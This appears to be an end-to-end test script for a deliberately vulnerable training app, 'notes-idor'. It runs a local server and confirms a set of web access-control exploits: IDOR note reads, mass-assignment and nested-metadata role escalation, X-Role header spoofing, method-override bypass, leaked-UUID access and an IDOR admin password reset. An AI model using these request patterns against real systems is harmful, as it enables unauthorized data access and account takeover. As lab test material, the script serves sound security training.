/**
 * Comprehensive E2E Verification Script for notes-idor
 */

const { spawn } = require('child_process');
const http = require('http');

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function request(options, postData = null) {
    return new Promise((resolve, reject) => {
        const req = http.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                let json = null;
                try {
                    json = JSON.parse(data);
                } catch (e) {}
                resolve({
                    status: res.statusCode,
                    headers: res.headers,
                    body: data,
                    json
                });
            });
        });

        req.on('error', reject);

        if (postData) {
            req.write(typeof postData === 'string' ? postData : JSON.stringify(postData));
        }
        req.end();
    });
}

async function runTests() {
    console.log('[TEST] Starting notes-idor server...');
    const serverProcess = spawn('node', ['src/index.js'], {
        cwd: __dirname,
        env: {
            ...process.env,
            PORT: '8002',
            DIFFICULTY: 'easy',
            FLAG_NOTES_IDOR_VIEW_EASY: 'VULNLAB{test_view_easy_1111111111111111}',
            FLAG_NOTES_IDOR_VIEW_MEDIUM: 'VULNLAB{test_view_med_22222222222222222}',
            FLAG_NOTES_IDOR_VIEW_HARD: 'VULNLAB{test_view_hard_3333333333333333}',
            FLAG_NOTES_IDOR_ADMIN_EASY: 'VULNLAB{test_admin_easy_4444444444444444}',
            FLAG_NOTES_IDOR_ADMIN_MEDIUM: 'VULNLAB{test_admin_med_55555555555555555}',
            FLAG_NOTES_IDOR_ADMIN_HARD: 'VULNLAB{test_admin_hard_6666666666666666}'
        },
        stdio: 'inherit'
    });

    await sleep(2000);

    let passed = 0;
    let failed = 0;

    function assert(cond, msg) {
        if (cond) {
            console.log(`  [PASS] ${msg}`);
            passed++;
        } else {
            console.error(`  [FAIL] ${msg}`);
            failed++;
        }
    }

    try {
        console.log('\n--- Test 1: Healthcheck ---');
        const health = await request({ host: '127.0.0.1', port: 8002, path: '/health', method: 'GET' });
        assert(health.status === 200 && health.json?.status === 'ok', 'Healthcheck returns 200 and status: ok');

        console.log('\n--- Test 2: Alice Authentication ---');
        const loginRes = await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/auth/login',
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        }, { username: 'alice', password: 'alice123' });

        assert(loginRes.status === 200 && loginRes.json?.status === 'success', 'Alice login successful');
        const cookie = loginRes.headers['set-cookie'] ? loginRes.headers['set-cookie'][0].split(';')[0] : '';
        assert(cookie.includes('connect.sid'), 'Received valid session cookie');

        console.log('\n--- Test 3: notes-idor-view (Easy) ---');
        // Alice views note ID 1 (belongs to admin)
        const viewEasy = await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/notes/1',
            method: 'GET',
            headers: { 'Cookie': cookie }
        });
        assert(viewEasy.status === 200, 'Note 1 fetched successfully');
        assert(viewEasy.json?.note?.content?.includes('VULNLAB{test_view_easy_1111111111111111}'), 'Admin note 1 contains FLAG_NOTES_IDOR_VIEW_EASY');

        console.log('\n--- Test 4: notes-idor-admin (Easy) ---');
        // Non-admin visits /api/admin/flag before escalation -> should be 403
        const preEsc = await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/admin/flag',
            method: 'GET',
            headers: { 'Cookie': cookie }
        });
        assert(preEsc.status === 403, 'Normal user receives 403 on /api/admin/flag');

        // Mass assignment: update profile with role: "admin"
        const massAssign = await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/users/profile',
            method: 'PUT',
            headers: { 'Cookie': cookie, 'Content-Type': 'application/json' }
        }, { full_name: 'Alice Admin', role: 'admin' });
        assert(massAssign.status === 200 && massAssign.json?.profile?.role === 'admin', 'Mass assignment granted role: admin');

        // Access admin flag
        const postEsc = await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/admin/flag',
            method: 'GET',
            headers: { 'Cookie': cookie }
        });
        assert(postEsc.status === 200 && postEsc.json?.flag === 'VULNLAB{test_admin_easy_4444444444444444}', 'Admin flag retrieved with FLAG_NOTES_IDOR_ADMIN_EASY');

        console.log('\n--- Switch Difficulty to Medium ---');
        const diffMed = await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/difficulty',
            method: 'POST',
            headers: { 'Cookie': cookie, 'Content-Type': 'application/json' }
        }, { difficulty: 'medium' });
        assert(diffMed.json?.difficulty === 'medium', 'Difficulty switched to medium');

        console.log('\n--- Test 5: notes-idor-view (Medium) ---');
        // Base64 encoding of '1' is 'MQ=='
        const viewMedB64 = await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/notes/MQ==',
            method: 'GET',
            headers: { 'Cookie': cookie }
        });
        assert(viewMedB64.status === 200, 'Note fetched with base64 encoded ID');
        assert(viewMedB64.json?.note?.content?.includes('VULNLAB{test_view_med_22222222222222222}'), 'Base64 note access returned FLAG_NOTES_IDOR_VIEW_MEDIUM');

        // Parameter override: ?note_id=1
        const viewMedParam = await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/notes/3?note_id=1',
            method: 'GET',
            headers: { 'Cookie': cookie }
        });
        assert(viewMedParam.status === 200 && viewMedParam.json?.note?.content?.includes('VULNLAB{test_view_med_22222222222222222}'), 'Query parameter override returned FLAG_NOTES_IDOR_VIEW_MEDIUM');

        console.log('\n--- Test 6: notes-idor-admin (Medium) ---');
        // Login as Bob (normal user)
        const bobLogin = await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/auth/login',
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        }, { username: 'bob', password: 'bob123' });
        const bobCookie = bobLogin.headers['set-cookie'][0].split(';')[0];

        // Ensure mass assignment does NOT work in Medium
        await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/users/profile',
            method: 'PUT',
            headers: { 'Cookie': bobCookie, 'Content-Type': 'application/json' }
        }, { role: 'admin' });
        const bobFlagNoHeader = await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/admin/flag',
            method: 'GET',
            headers: { 'Cookie': bobCookie, 'X-Difficulty': 'medium' }
        });
        assert(bobFlagNoHeader.status === 403, 'Mass assignment blocked in medium mode');

        // Header spoofing: X-Role: admin
        const bobHeaderSpoof = await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/admin/flag',
            method: 'GET',
            headers: { 'Cookie': bobCookie, 'X-Role': 'admin', 'X-Difficulty': 'medium' }
        });
        assert(bobHeaderSpoof.status === 200 && bobHeaderSpoof.json?.flag === 'VULNLAB{test_admin_med_55555555555555555}', 'Header spoofing X-Role: admin returned FLAG_NOTES_IDOR_ADMIN_MEDIUM');

        // Method override: X-HTTP-Method-Override: ADMIN
        const bobMethodOverride = await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/admin/flag',
            method: 'GET',
            headers: { 'Cookie': bobCookie, 'X-HTTP-Method-Override': 'ADMIN', 'X-Difficulty': 'medium' }
        });
        assert(bobMethodOverride.status === 200 && bobMethodOverride.json?.flag === 'VULNLAB{test_admin_med_55555555555555555}', 'Method override returned FLAG_NOTES_IDOR_ADMIN_MEDIUM');

        console.log('\n--- Switch Difficulty to Hard ---');
        await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/difficulty',
            method: 'POST',
            headers: { 'Cookie': bobCookie, 'Content-Type': 'application/json' }
        }, { difficulty: 'hard' });

        console.log('\n--- Test 7: notes-idor-view (Hard) ---');
        // Discover leaked note UUID from public profile or activity log
        const pubProf = await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/users/admin/public-profile',
            method: 'GET'
        });
        assert(pubProf.status === 200 && pubProf.json?.user?.public_notes?.length > 0, 'Admin public profile retrieved');
        const leakedUuid = pubProf.json?.user?.public_notes[0]?.uuid;
        assert(leakedUuid === 'a1b2c3d4-e5f6-4789-9abc-def012345678', `Admin note UUID leaked: ${leakedUuid}`);

        // Also check activity log leak
        const actLog = await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/activity',
            method: 'GET'
        });
        const hasUuidInLog = actLog.json?.activity?.some(a => a.note_uuid === leakedUuid);
        assert(hasUuidInLog, 'Admin note UUID also disclosed in /api/activity log');

        // Access note via leaked UUID
        const viewHard = await request({
            host: '127.0.0.1',
            port: 8002,
            path: `/api/notes/${leakedUuid}`,
            method: 'GET',
            headers: { 'Cookie': bobCookie }
        });
        assert(viewHard.status === 200 && viewHard.json?.note?.content?.includes('VULNLAB{test_view_hard_3333333333333333}'), 'Leaked UUID note access returned FLAG_NOTES_IDOR_VIEW_HARD');

        console.log('\n--- Test 8: notes-idor-admin (Hard) ---');
        // Ensure header spoofing is ignored in Hard mode
        const spoofHard = await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/admin/flag',
            method: 'GET',
            headers: { 'Cookie': bobCookie, 'X-Role': 'admin' }
        });
        assert(spoofHard.status === 403, 'Header spoofing is ignored in Hard mode');

        // Method A: Nested metadata escalation {"metadata": {"role": "admin"}}
        const nestedEsc = await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/users/profile',
            method: 'PUT',
            headers: { 'Cookie': bobCookie, 'Content-Type': 'application/json' }
        }, { metadata: { role: 'admin' } });
        assert(nestedEsc.status === 200 && nestedEsc.json?.profile?.role === 'admin', 'Nested metadata parameter granted role: admin');

        const flagHard = await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/admin/flag',
            method: 'GET',
            headers: { 'Cookie': bobCookie }
        });
        assert(flagHard.status === 200 && flagHard.json?.flag === 'VULNLAB{test_admin_hard_6666666666666666}', 'Privilege escalation returned FLAG_NOTES_IDOR_ADMIN_HARD');

        // Method B: IDOR on PUT /api/users/:id to reset admin's password
        const pwReset = await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/users/1',
            method: 'PUT',
            headers: { 'Cookie': bobCookie, 'Content-Type': 'application/json' }
        }, { password: 'NewAdminPassword2026!' });
        assert(pwReset.status === 200, 'IDOR on PUT /api/users/1 updated Admin password');

        const adminLoginNew = await request({
            host: '127.0.0.1',
            port: 8002,
            path: '/api/auth/login',
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        }, { username: 'admin', password: 'NewAdminPassword2026!' });
        assert(adminLoginNew.status === 200 && adminLoginNew.json?.user?.role === 'admin', 'Login as admin with reset password successful');

    } catch (err) {
        console.error('Test execution failed with error:', err);
        failed++;
    } finally {
        serverProcess.kill('SIGTERM');
        console.log(`\n=========================================`);
        console.log(`E2E Test Results: ${passed} Passed, ${failed} Failed`);
        console.log(`=========================================`);
        process.exit(failed > 0 ? 1 : 0);
    }
}

runTests();
